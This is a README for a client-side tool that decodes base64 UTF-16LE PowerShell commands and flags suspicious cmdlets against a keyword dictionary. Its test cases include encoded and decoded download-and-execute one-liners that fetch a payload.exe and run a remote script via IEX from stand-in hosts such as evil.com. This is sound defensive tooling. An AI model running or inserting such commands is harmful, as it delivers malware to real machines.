# PowerShell-Decoder 🛡️

**A specialized, client-side tool for decoding and analyzing obfuscated PowerShell scripts.**

🔗 **Live Demo:** https://samdavi.github.io/Powershell-Decoder/

---

## 🧐 Why I Built This (The Problem)

If you work in defensive security or system administration, you have likely seen PowerShell commands that look like this:

```text
powershell -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAA==
```

When you try to decode this using standard online Base64 tools, you usually get unreadable output like this:

```text
I.n.v.o.k.e.-.E.x.p.r.e.s.s.i.o.n.
```

### Why does this happen?

Windows PowerShell natively encodes commands using **UTF-16LE (Wide Character)** encoding.  
Most Base64 tools assume **UTF-8** or **ASCII**, which causes the decoded output to appear corrupted.

### ✅ The Solution

PowerShell-Decoder is purpose-built to handle PowerShell’s encoding quirks automatically.

It doesn’t just decode the text — it **analyzes** it against a dictionary of known PowerShell behaviors to help you understand *what the script is trying to do*, such as:

- Downloading files
- Bypassing execution policies
- Running fileless malware
- Hiding execution windows

---

## ✨ Features

- **⚡ Accurate Decoding**  
  Automatically decodes PowerShell Base64 strings using UTF-16LE.

- **🔒 Secure & Private**  
  **100% client-side.** No data ever leaves your browser.

- **🧠 Threat Analysis**  
  Scans decoded scripts against a curated dictionary of suspicious and informational PowerShell commands.

- **🎨 Smart Highlighting**  
  - 🔴 **Danger / Suspicious**
  - 🔵 **Informational / Benign**

---

## 🧪 Try It Yourself (Test Cases)

Copy and paste the following Base64 strings into the tool.

---

### 1. Hello World (Safe Test)

Verifies that UTF-16LE decoding is working correctly.

```text
VwByAGkAdABlAC0ASABvAHMAdAAgACIAVwBlAGwAYwBvAG0AZQAgAHQAbwAgAFAAbwB3AGUAcgBzAGgAZQBsAGwALQBEAGUAYwBvAGQAZQByACEAIgA=
```

**Decoded Output**
```powershell
Write-Host "Welcome to Powershell-Decoder!"
```

**Analysis**
- 🔵 Informational result for `Write-Host`

---

### 2. Malware Downloader (Threat Simulation)

Verifies that the threat dictionary catches dangerous network activity.

```text
SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAHMAaQB0AGUALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAQwA6AFwAVABlAG0AcABcAHYAaQByAHUAcwAuAGUAeABlACIADQA=
```

**Decoded Output**
```powershell
Invoke-WebRequest -Uri "http://malicious.site/payload.exe" -OutFile "C:\Temp\virus.exe"
```

**Analysis**
- 🔴 Dangerous indicators detected:
  - Invoke-WebRequest
  - OutFile

---

### 3. Fileless Loader (Advanced)

Checks for aliased and fileless execution techniques.

```text
SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwBjAHIAaQBwAHQALgBwAHMAMQAnACkA
```

**Decoded Output**
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')
```

**Analysis**
- 🔴 Dangerous indicators detected:
  - IEX
  - New-Object
  - Net.WebClient
  - DownloadString

---

## 🛠️ How It Works (Technical Overview)

1. **Input**  
   A Base64-encoded PowerShell string is provided by the user.

2. **Decoding**  
   JavaScript converts the Base64 string into a byte array (`Uint8Array`) and decodes it using:
   ```js
   new TextDecoder("utf-16le")
   ```

3. **Dictionary Lookup**  
   The decoded output is scanned against `cmdlet_map.json`, which acts as a knowledge base of PowerShell commands.

4. **Matching**  
   Regex matching is used to find known keywords in the decoded script.

5. **Classification**
   - Commands containing `ℹ️ INFO:` are marked as informational (blue).
   - All others are treated as suspicious (red).

---

## 🤝 How to Contribute

The intelligence of this tool lives in the `cmdlet_map.json` file.

If you know a PowerShell command that is:
- Commonly abused in attacks, or
- Legitimate but confusing for beginners

Please contribute!

### Steps

1. Fork the repository
2. Open `cmdlet_map.json`
3. Add a new entry using this format:

```json
"My-Command": "DESCRIPTION GOES HERE"
```

### Style Guide

- **Dangerous Commands**  
  Start with an emoji category:
  - ⚠️ DANGEROUS:
  - 🌐 NETWORK:
  - 📂 FILE:

- **Safe / Informational Commands**  
  Must include `ℹ️ INFO:` so they are highlighted blue.

**Examples**
```json
"Remove-Item": "📂 FILE: Deletes a file or folder.",
"Get-Date": "ℹ️ INFO: Displays the current date and time."
```

4. Submit a Pull Request

---

## ⚠️ Disclaimer

This tool is intended for **defensive security analysis and educational purposes only**.

The author is not responsible for misuse.  
Always analyze malware in a safe, isolated environment such as a VM or sandbox.

---

Created by **samdavi**
